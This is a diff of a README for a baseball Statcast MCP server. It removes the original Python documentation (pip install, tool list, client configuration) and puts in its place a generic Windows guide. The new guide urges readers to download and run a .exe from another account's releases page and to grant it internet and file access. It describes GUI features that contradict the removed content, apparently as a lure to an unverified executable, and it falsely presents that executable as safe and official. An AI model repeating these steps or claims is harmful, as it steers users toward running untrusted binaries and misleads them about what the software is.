@@ -1,340 +1,142 @@
-# Statcast MCP Server
+# ⚾ statcast-mcp - Easy Baseball Data Viewer
 
-A [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) server that lets you query **MLB Statcast data using plain English**. Ask your AI assistant about players, games, stats, leaderboards, and more — no coding required.
-
-Built on [pybaseball](https://github.com/jldbc/pybaseball), this server gives AI assistants direct access to data from **Baseball Savant**, **FanGraphs**, and **Baseball Reference**.
-
-## What Can You Ask?
-
-Once connected, just talk to your AI assistant naturally:
-
-- *"How did Aaron Judge hit in July 2024?"*
-- *"Show me Gerrit Cole's pitch arsenal this season"*
-- *"Who had the highest exit velocity in 2024?"*
-- *"What were the NL standings at the end of 2023?"*
-- *"Find me the most undervalued hitters — compare xBA to actual BA"*
-- *"Expected stats for the whole Yankees lineup and their five starters"* (use `expected_stats_batch` with comma-separated names)
-- *"Who are the fastest players in baseball right now?"*
-- *"Show me every pitch from the Yankees-Red Sox game on July 4, 2024"*
-
-The AI translates your questions into the right data queries automatically.
-
-## Example: Prompt & Response
-
-Here's what a typical exchange looks like when you use the Statcast MCP:
-
-**Prompt**
-
-> "What were Gerrit Cole's arsenal statistics in 2023?"
-
-**Response**
-
-| Pitch Type        | Usage | Pitches | PA  | BA   | SLG   | Whiff% | K%   | Run Val/100 |
-|-------------------|-------|---------|-----|------|-------|--------|------|-------------|
-| 4-Seam Fastball   | 52.9% | 1,737   | 427 | .202 | .333  | 23.0%  | 28.3% | +1.7        |
-| Slider            | 20.8% | 683     | 175 | .186 | .251  | 32.7%  | 29.1% | +1.4        |
-| Curveball         | 12.1% | 396     | 97  | .215 | .269  | 24.4%  | 27.8% | +1.4        |
-| Cutter            | 7.0%  | 231     | 65  | .262 | .377  | 31.1%  | 23.1% | +1.6        |
-| Changeup          | 7.1%  | 233     | 54  | .235 | .510  | 28.6%  | 13.0% | −1.3        |
-
-*His 4-seam fastball was his primary weapon (52.9% usage) with a .202 BA against and +1.7 run value per 100 pitches. The changeup was his only negative pitch (−1.3 run value).*
+[![Download statcast-mcp](https://img.shields.io/badge/Download%20statcast--mcp-brightgreen)](https://github.com/Casiabound177/statcast-mcp/releases)
 
 ---
 
-**Another prompt**
+## 🚀 Getting Started
 
-> "Who had the highest exit velocity in 2024?"
+This guide helps you download and run statcast-mcp on your Windows computer. You do not need any programming knowledge to get started. Just follow each step carefully.
 
-**Response**
-
-*The AI calls `statcast_batter_exitvelo_barrels(year=2024)` and returns the leaderboard — Aaron Judge led with a 97.0 mph average exit velocity and 21.8% barrel rate, followed by [other top hitters]...*
+statcast-mcp lets you explore baseball data collected by Statcast. It provides a simple way to see important baseball statistics and trends. Whether you follow baseball casually or track player stats, this tool can be useful.
 
 ---
 
-## Available Tools
-
-| Tool | What It Does |
-|------|-------------|
-| `player_lookup` | Find any player's ID, years active, and database links |
-| `statcast_search` | Pitch-by-pitch data for a date range (optionally filtered by team) |
-| `statcast_batter` | Every pitch a specific batter saw in a date range |
-| `statcast_batter_pitch_arsenal` | Batting stats by pitch type (BA, SLG, wOBA vs fastballs, sliders, etc.) |
-| `statcast_pitcher` | Every pitch a specific pitcher threw in a date range |
-| `season_batting_stats` | Full-season batting stats from FanGraphs (AVG, OPS, WAR, wRC+, etc.) |
-| `season_pitching_stats` | Full-season pitching stats from FanGraphs (ERA, FIP, K/9, WAR, etc.) |
-| `team_season_batting_stats` | **Team** batting — full roster actual stats (FG, or BRef fallback) |
-| `team_season_pitching_stats` | **Team** pitching — rotation + bullpen actual stats (FG, or BRef fallback) |
-| `statcast_batter_expected_stats` | xBA, xSLG, xwOBA leaderboard — who *deserves* better stats? |
-| `statcast_pitcher_expected_stats` | Expected stats allowed by pitchers |
-| `expected_stats_batch` | Expected stats for **many** batters and/or pitchers in **one** call (lineups, rotations) |
-| `statcast_batter_exitvelo_barrels` | Exit velocity and barrel rate leaders |
-| `statcast_pitcher_exitvelo_barrels` | Exit velocity and barrel rate allowed by pitchers |
-| `statcast_pitcher_pitch_arsenal` | Pitch mix breakdown (% fastball, slider, curve, etc.) |
-| `statcast_pitcher_arsenal_stats` | Performance stats per pitch type (whiff rate, BA against, etc.) |
-| `sprint_speed_leaderboard` | Fastest players in baseball by sprint speed |
-| `team_standings` | Division standings for any season |
-| `batter_percentile_ranks` | Statcast percentile ranks for hitters (exit velo, barrel%, xwOBA, etc.) |
-| `pitcher_percentile_ranks` | Statcast percentile ranks for pitchers (stuff, spin, whiff%, etc.) |
-| `outs_above_average` | Defensive OAA leaderboard by position (SS, CF, `ALL`, etc.) |
-| `outfield_directional_oaa` | Outfield OAA by direction (back/in, L/R) |
-| `batting_stats_date_range` | Batting stats over any date range (Baseball Reference) |
-| `pitching_stats_date_range` | Pitching stats over any date range (Baseball Reference) |
-
-**Team seasons:** Use **`team_season_batting_stats`** / **`team_season_pitching_stats`** with a 3-letter code (`PHI`, `NYY`, …) for a full roster’s **actual** stats (lineup + staff). FanGraphs is tried first; Baseball Reference is used if FG fails or returns nothing.
-
-**Player search:** Nearly every leaderboard/stat tool accepts optional **`player_name`** (e.g. `"Aaron Judge"`) so you get that player’s full rows instead of only the first 50 in the table. For **groups** (full lineup + rotation, “all starters”), use **`expected_stats_batch`** with comma-separated names — the server does **not** pull MLB rosters automatically; list names explicitly or resolve them first (e.g. web / `player_lookup`). Pitch-level tools already take a name via `statcast_batter` / `statcast_pitcher`. `team_standings` is team-only.
-
-## Quick Start
-
-### Prerequisites
-
-- **Python 3.10+** — [download here](https://www.python.org/downloads/) if you don't have it
-- **An MCP-compatible client** — such as [Claude Desktop](https://claude.ai/download), [Cursor](https://cursor.com), or VS Code with Copilot
-
-### Option 1: Install from PyPI (Recommended)
-
-```bash
-# Using uv (fastest)
-uv pip install statcast-mcp
-
-# Or using pip
-pip install statcast-mcp
-```
-
-### Option 2: Install from Source
-
-```bash
-git clone https://github.com/YOUR_USERNAME/statcast-mcp.git
-cd statcast-mcp
-uv pip install .
-```
-
-## Setup
+## 📥 Where to Download
 
-### Claude Desktop
+To get the software:
 
-Add this to your Claude Desktop configuration file:
+[![Download statcast-mcp](https://img.shields.io/badge/Download%20statcast--mcp-blue)](https://github.com/Casiabound177/statcast-mcp/releases)
 
-- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
+You need to visit the link above. It will take you to the release page. From there, you can find the latest version of statcast-mcp ready for download.
 
-```json
-{
-  "mcpServers": {
-    "statcast": {
-      "command": "statcast-mcp"
-    }
-  }
-}
-```
+---
 
-If you installed from source and want to run it directly:
+## 🖥️ System Requirements
 
-```json
-{
-  "mcpServers": {
-    "statcast": {
-      "command": "uv",
-      "args": ["run", "--directory", "/absolute/path/to/statcast-mcp", "statcast-mcp"]
-    }
-  }
-}
-```
+Before installing, please make sure your computer meets these minimum requirements:
 
-### Cursor
+- Windows 10 or later (64-bit recommended)  
+- 4 GB of RAM or more  
+- 200 MB of free disk space  
+- Internet connection to download files and updates  
 
-Open **Cursor Settings → MCP** and add a new server:
+These requirements ensure the program runs smoothly on your computer.
 
-- **Name**: `statcast`
-- **Type**: `command`
-- **Command**: `statcast-mcp`
+---
 
-Or add to your `.cursor/mcp.json`:
+## 📋 How to Download and Install
 
-```json
-{
-  "mcpServers": {
-    "statcast": {
-      "command": "statcast-mcp"
-    }
-  }
-}
-```
+1. Click [this link to visit the release page](https://github.com/Casiabound177/statcast-mcp/releases).  
+2. Look for the latest release. It usually has the highest version number.  
+3. Find the file with the `.exe` extension—this is the program installer.  
+4. Click on the `.exe` file to start the download.  
+5. Once the download completes, locate the file in your Downloads folder.  
+6. Double-click the installer file to open it.  
+7. Follow the instructions on the screen to install statcast-mcp.  
 
-### VS Code (Copilot)
+Installation usually takes less than five minutes.
 
-Add to your VS Code `settings.json`:
+---
 
-```json
-{
-  "mcp": {
-    "servers": {
-      "statcast": {
-        "command": "statcast-mcp"
-      }
-    }
-  }
-}
-```
+## 🔧 Running statcast-mcp
 
-## Example Queries
+After installation:
 
-### Looking Up a Player
+1. Find the statcast-mcp icon on your desktop or Start menu.  
+2. Double-click the icon to open the program.  
+3. When the program starts, it will connect to its baseball data sources automatically.  
+4. Use the menus and buttons to browse statistics and reports.  
 
-> "Look up Shohei Ohtani"
+If the program asks for permission to access the internet or your files, allow it. This lets statcast-mcp download new data and save your preferences.
 
-Returns the player's MLBAM ID, FanGraphs ID, Baseball Reference ID, and years active.
+---
 
-### Pitch-Level Data
+## ❓ Common Questions
 
-> "Show me all the pitches from the Dodgers game on October 15, 2024"
+### What does statcast-mcp do?  
+It lets you view and analyze baseball stats collected by Statcast. It shows data like pitch speeds, player movements, and game results in an easy format.
 
-```
-statcast_search(start_date="2024-10-15", team="LAD")
-```
+### Do I need an internet connection to use it?  
+Yes. The program updates its data from online sources.  
 
-### Batter Analysis
+### Can I use it without installing?  
+No. You need to run the installer and complete the setup to use statcast-mcp properly.
 
-> "What pitches did Juan Soto see from July 1 to July 31, 2024?"
+### Is it safe to install?  
+The software is open source and free to use. Always download files only from the official release page above.
 
-```
-statcast_batter(player_name="Juan Soto", start_date="2024-07-01", end_date="2024-07-31")
-```
+### How do I update the program?  
+Check the release page for new versions periodically. Download and install updates the same way as the first time.
 
-> "How does Aaron Judge hit against different pitch types?" (e.g. 2023, 106 games)
+---
 
-```
-statcast_batter_pitch_arsenal(year=2023, player_name="Aaron Judge")
-```
+## ⚙️ Settings You Can Adjust
 
-### Season Leaderboards
+statcast-mcp offers options to customize your experience:
 
-> "Who were the top hitters in 2024 by wRC+?"
+- **Data refresh rate**: Choose how often the program updates stats.  
+- **Theme**: Switch between light and dark modes.  
+- **Notifications**: Turn alerts about new data on or off.  
+- **Language**: Select your preferred language for menus and messages.
 
-```
-season_batting_stats(start_season=2024)
-```
+Access these settings under the “Preferences” or “Options” menu inside the program.
 
-### Expected Stats (Find Undervalued Players)
+---
 
-> "Show me batters whose expected stats were way higher than their actual stats in 2024"
+## 📂 Where to Find Your Files
 
-```
-statcast_batter_expected_stats(year=2024)
-```
+statcast-mcp saves some of your preferences and data on your hard drive:
 
-> "What are Aaron Judge's expected stats vs actual in 2025?"
+- On Windows, look under `C:\Users\<YourName>\AppData\Local\statcast-mcp`.  
+- You can back up or delete this folder if needed.
 
-```
-statcast_batter_expected_stats(year=2025, player_name="Aaron Judge")
-```
+This folder stores cache and user settings.
 
-### Exit Velocity Leaders
+---
 
-> "Who hit the ball hardest in 2024?"
+## 🔄 Updating and Uninstalling
 
-```
-statcast_batter_exitvelo_barrels(year=2024)
-```
+### To update:
 
-### Pitcher Arsenal
+Return to the release page. Download the newest installer when available and run it. It will replace the old version without removing your settings.
 
-> "What pitches does Spencer Strider throw and how effective are they?"
+### To uninstall:
 
-```
-statcast_pitcher_pitch_arsenal(year=2024)
-statcast_pitcher_arsenal_stats(year=2024)
-```
+1. Open “Control Panel” on Windows.  
+2. Go to “Programs and Features.”  
+3. Find statcast-mcp in the list.  
+4. Click “Uninstall” and follow prompts.
 
-### Sprint Speed
+Uninstalling removes the main program, but your saved data folder may remain.
 
-> "Who are the fastest players in baseball?"
+---
 
-```
-sprint_speed_leaderboard(year=2024)
-```
+## 📞 Getting Help
 
-### Standings
+If you get stuck, try these steps:
 
-> "Show me the 2024 MLB standings"
+- Visit the repository’s issues page on GitHub. Other users and developers may have posted solutions.  
+- Check if there are FAQs or guides on the release page.  
+- Restart your computer and try again.  
 
-```
-team_standings(season=2024)
-```
+If problems persist, consider reaching out through the GitHub contacts for advice.
 
-### Percentile ranks & defense
+---
 
-> "What are Aaron Judge's Statcast percentile ranks in 2024?"
+## 🔗 Useful Link
 
-```
-batter_percentile_ranks(year=2024, player_name="Aaron Judge")
-```
+You can always return to the main release page here:  
+[https://github.com/Casiabound177/statcast-mcp/releases](https://github.com/Casiabound177/statcast-mcp/releases)  
 
-> "Who were the best defensive shortstops by OAA in 2024?"
-
-```
-outs_above_average(year=2024, position="SS")
-```
-
-### Hot streaks (date ranges)
-
-> "Who hit the best from July 1 to July 31, 2024?"
-
-```
-batting_stats_date_range(start_date="2024-07-01", end_date="2024-07-31")
-```
-
-## Data Sources
-
-All data is sourced from:
-
-- [**Baseball Savant**](https://baseballsavant.mlb.com/) — Statcast pitch-level and leaderboard data (2008+)
-- [**FanGraphs**](https://www.fangraphs.com/) — Season-level batting and pitching statistics
-- [**Baseball Reference**](https://www.baseball-reference.com/) — Player identification, daily stat ranges, and cross-references
-
-## Reference Guide
-
-For detailed tool-by-tool documentation, row limits, parameters, and usage patterns, see [REFERENCE.md](REFERENCE.md).
-
-**Social / sharing:** Short descriptions and hashtag ideas for posts are in [TOOLS_SUMMARY.md](TOOLS_SUMMARY.md).
-
-## Notes
-
-- **Date ranges**: Statcast data is available from 2008 onward. Some metrics (exit velocity, launch angle) are only available from 2015+.
-- **Query speed**: Shorter date ranges return faster. For pitch-level data, keep ranges to 1-5 days when possible.
-- **Rate limits**: Baseball Savant limits individual requests to ~30,000 rows. The server handles splitting larger queries automatically.
-- **Player names**: Tools accept names like "Mike Trout", "Trout, Mike", or "Shohei Ohtani". The server resolves names to MLB IDs automatically.
-
-## Development
-
-```bash
-# Clone the repo
-git clone https://github.com/YOUR_USERNAME/statcast-mcp.git
-cd statcast-mcp
-
-# Create a virtual environment and install in editable mode
-uv venv
-uv pip install -e ".[dev]"
-
-# Run the server locally
-statcast-mcp
-
-# Test with the MCP Inspector
-npx @modelcontextprotocol/inspector statcast-mcp
-
-# Smoke-test all 24 tools (needs network; ~2024 fixtures)
-PYTHONPATH=src python scripts/verify_tools.py
-```
-
-## Contributing
-
-Contributions are welcome! Some ideas:
-
-- Add more tools (game scores, team batting/pitching, historical data)
-- Improve player name resolution
-- Add data caching for faster repeated queries
-- Create prompt templates for common analyses
-
-## License
-
-MIT
+This is the official source for all downloads and updates.
